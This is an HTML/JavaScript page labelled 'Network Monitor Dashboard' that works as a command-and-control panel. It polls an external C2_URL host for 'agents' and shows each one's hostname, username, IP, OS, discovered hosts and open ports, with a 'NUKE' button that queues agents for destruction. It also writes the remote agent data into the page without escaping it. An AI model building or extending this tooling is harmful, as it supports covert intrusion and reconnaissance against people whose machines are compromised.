<!DOCTYPE html>
<html>
<head>
    <title>Network Monitor Dashboard</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; margin: 0; padding: 20px; background: #0f0f23; color: white; }
        .agent { background: #1a1a2e; padding: 20px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #00d4ff; }
        .status-online { color: #00ff88; }
        .status-offline { color: #ff4444; }
        .nuke-btn { background: #ff4444; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; }
    </style>
</head>
<body>
    <h1>Network Monitor Dashboard</h1>
    <div id="agents" class="grid"></div>
    
    <script>
        const C2_URL = 'https://sniff-sniff.vercel.app';
        let agents = {};
        let destroyAgents = [];

        async function nukeAgent(agentId) {
            destroyAgents.push(agentId);
            localStorage.setItem('destroyAgents', JSON.stringify(destroyAgents));
            updateDashboard();
        }

        function updateAgentDisplay(agent) {
            const now = Date.now();
            const lastSeen = new Date(agent.last_seen).getTime();
            const status = (now - lastSeen < 120000) ? 'online' : 'offline'; // 2min timeout
            
            return `
                <div class="agent ${status}">
                    <h3>${agent.hostname} (${agent.agent_id})</h3>
                    <p><strong>User:</strong> ${agent.username}</p>
                    <p><strong>IP:</strong> ${agent.network?.local_ip || 'Unknown'}</p>
                    <p><strong>OS:</strong> ${agent.platform}</p>
                    <p><strong>Last Seen:</strong> ${new Date(agent.last_seen).toLocaleString()}</p>
                    ${agent.network?.active_hosts?.length ? 
                        `<p><strong>Active Hosts:</strong> ${agent.network.active_hosts.slice(0,5).join(', ')}${agent.network.active_hosts.length > 5 ? '...' : ''}</p>` : ''}
                    ${agent.network?.open_ports?.length ? 
                        `<p><strong>Open Ports:</strong> ${agent.network.open_ports.slice(0,10).join(', ')}</p>` : ''}
                    <button class="nuke-btn" onclick="nukeAgent('${agent.agent_id}')">NUKE</button>
                </div>
            `;
        }

        function updateDashboard() {
            const container = document.getElementById('agents');
            container.innerHTML = Object.values(agents)
                .map(updateAgentDisplay)
                .join('');
        }

        // Poll for agents every 30s
        setInterval(async () => {
            try {
                const response = await fetch(`${C2_URL}/api/agents`);
                if (response.ok) {
                    agents = await response.json();
                    updateDashboard();
                }
            } catch (e) {
                console.log('Dashboard update failed:', e);
            }
        }, 30000);

        // Load destroy list
        destroyAgents = JSON.parse(localStorage.getItem('destroyAgents') || '[]');
        updateDashboard();
    </script>
</body>
</html>
